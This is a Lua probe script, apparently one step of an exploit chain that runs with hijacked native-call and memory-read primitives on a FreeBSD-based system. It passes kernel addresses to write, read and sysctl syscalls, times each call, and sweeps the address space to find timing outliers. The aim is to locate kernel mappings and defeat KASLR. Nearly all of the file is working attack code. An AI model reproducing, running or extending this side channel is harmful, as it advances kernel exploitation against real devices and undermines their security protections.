-- CRASH_CLASS: LOW
-- PROBE 172a: Verify KASLR timing outlier at 0xFFFF800016000000
--
-- 171a showed chunk 11 (kva+0x16000000) at 1768ms — 3x slower than
-- all other kernel VAs (~600ns). Need to verify consistency:
-- 1. Repeat the 16-chunk sweep 5 times
-- 2. Fine-grained sweep around 0x14-0x1A with 2MB steps
-- 3. Check if the outlier moves between runs (ASLR slide?)

print("=== PROBE 172a: KASLR TIMING VERIFY ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local stub = syscall.pipe.fn_addr

-- Verify
local ok, rv = pcall(native.fcall_with_rax, stub, 20)
print("verify getpid=" .. to_num(rv))

-- Create pipe
local ok2, pfd = pcall(native.fcall_with_rax, stub, 42)
local pipe_rd = to_num(pfd)
print("pipe=" .. pipe_rd)

-- GPU buffer
local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x100000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

local TS1 = 0x10000
local TS2 = 0x10100
local ITERS = 30

local function measure_kva_write(kva_str)
    local kva = uint64(kva_str)
    pcall(native.fcall_with_rax, stub, 232, 4, ga(TS1))
    for i = 1, ITERS do
        pcall(native.fcall_with_rax, stub, 4, pipe_rd + 1, kva, 1)
    end
    pcall(native.fcall_with_rax, stub, 232, 4, ga(TS2))

    local s1 = to_num(memory.read_dword(gpu + TS1))
    local ns1 = to_num(memory.read_dword(gpu + TS1 + 8))
    local s2 = to_num(memory.read_dword(gpu + TS2))
    local ns2 = to_num(memory.read_dword(gpu + TS2 + 8))
    return (s2 - s1) * 1000000000 + (ns2 - ns1)
end

-- [A] Repeat 32MB-step sweep 5 times
print("")
print("--- [A] REPEATED 32MB SWEEP (5 runs) ---")

local sweep_data = {}
for run = 1, 5 do
    sweep_data[run] = {}
    local line = "R" .. run .. ":"
    for chunk = 0, 15 do
        local kva_off = chunk * 0x2000000
        local t = measure_kva_write(string.format("0xFFFF8000%08X", kva_off))
        sweep_data[run][chunk] = t
        line = line .. " " .. math.floor(t / 1000) .. "us"
    end
    print(line)
end

-- Find consistent outliers (>2x average across all runs)
print("")
print("--- [B] OUTLIER ANALYSIS ---")
for chunk = 0, 15 do
    local sum = 0
    local max = 0
    local min = 999999999
    for run = 1, 5 do
        local t = sweep_data[run][chunk]
        sum = sum + t
        if t > max then max = t end
        if t < min then min = t end
    end
    local avg = sum / 5

    -- Calculate overall average across all chunks
    local total_sum = 0
    local total_count = 0
    for c2 = 0, 15 do
        for r2 = 1, 5 do
            total_sum = total_sum + sweep_data[r2][c2]
            total_count = total_count + 1
        end
    end
    local global_avg = total_sum / total_count

    if avg > global_avg * 1.5 then
        print(string.format("  *** CHUNK %d (0xFFFF8000%08X): avg=%dus min=%dus max=%dus (%.1fx global avg)",
            chunk, chunk * 0x2000000, math.floor(avg/1000),
            math.floor(min/1000), math.floor(max/1000), avg / global_avg))
    end
end

-- [C] Fine-grained sweep: 2MB steps around 0x10-0x1C
print("")
print("--- [C] FINE 2MB SWEEP (0x10000000-0x1C000000) ---")
for step = 8, 14 do
    local kva_off = step * 0x2000000
    local line = string.format("0x%08X:", kva_off)
    for run = 1, 3 do
        local t = measure_kva_write(string.format("0xFFFF8000%08X", kva_off))
        line = line .. " " .. math.floor(t / 1000) .. "us"
    end
    print(line)
end

-- [D] Even finer: 0x200000 (2MB) steps from 0x14-0x18 (if outlier is real)
print("")
print("--- [D] ULTRA-FINE 2MB SWEEP (0x14-0x18) ---")
for off_mb = 0x14, 0x18, 0x2 do
    local kva_off = off_mb * 0x1000000
    local times = {}
    for run = 1, 3 do
        local t = measure_kva_write(string.format("0xFFFF8000%08X", kva_off))
        table.insert(times, math.floor(t / 1000))
    end
    print(string.format("0x%08X: %s us", kva_off, table.concat(times, " ")))
end

-- [E] Test if the effect is syscall-specific
-- Try with write vs sysctl vs other syscalls
print("")
print("--- [E] DIFFERENT SYSCALLS AT OUTLIER ---")
local outlier_va = uint64("0xFFFF800016000000")
local normal_va = uint64("0xFFFF800000000000")

-- sysctl(mib=outlier, 2, outbuf, lenp, 0, 0)
local function measure_sysctl(addr_str)
    local addr = uint64(addr_str)
    pcall(native.fcall_with_rax, stub, 232, 4, ga(TS1))
    for i = 1, ITERS do
        pcall(native.fcall_with_rax, stub, 202, addr, 2, ga(0x50000), ga(0x50100), 0, 0)
    end
    pcall(native.fcall_with_rax, stub, 232, 4, ga(TS2))
    local s1 = to_num(memory.read_dword(gpu + TS1))
    local ns1 = to_num(memory.read_dword(gpu + TS1 + 8))
    local s2 = to_num(memory.read_dword(gpu + TS2))
    local ns2 = to_num(memory.read_dword(gpu + TS2 + 8))
    return (s2 - s1) * 1000000000 + (ns2 - ns1)
end

local t_sctl_normal = measure_sysctl("0xFFFF800000000000")
local t_sctl_outlier = measure_sysctl("0xFFFF800016000000")
print("sysctl normal:  " .. math.floor(t_sctl_normal/1000) .. "us")
print("sysctl outlier: " .. math.floor(t_sctl_outlier/1000) .. "us")

-- read(fd, kernel_va, 1)
local function measure_read(addr_str)
    local addr = uint64(addr_str)
    pcall(native.fcall_with_rax, stub, 232, 4, ga(TS1))
    for i = 1, ITERS do
        pcall(native.fcall_with_rax, stub, 3, pipe_rd, addr, 1)
    end
    pcall(native.fcall_with_rax, stub, 232, 4, ga(TS2))
    local s1 = to_num(memory.read_dword(gpu + TS1))
    local ns1 = to_num(memory.read_dword(gpu + TS1 + 8))
    local s2 = to_num(memory.read_dword(gpu + TS2))
    local ns2 = to_num(memory.read_dword(gpu + TS2 + 8))
    return (s2 - s1) * 1000000000 + (ns2 - ns1)
end

local t_read_normal = measure_read("0xFFFF800000000000")
local t_read_outlier = measure_read("0xFFFF800016000000")
print("read normal:  " .. math.floor(t_read_normal/1000) .. "us")
print("read outlier: " .. math.floor(t_read_outlier/1000) .. "us")

-- Close pipe
pcall(native.fcall_with_rax, stub, 6, pipe_rd)
pcall(native.fcall_with_rax, stub, 6, pipe_rd + 1)

print("")
print("pid_post=" .. to_num(make_syscall(20)()))
print("=== DONE ===")
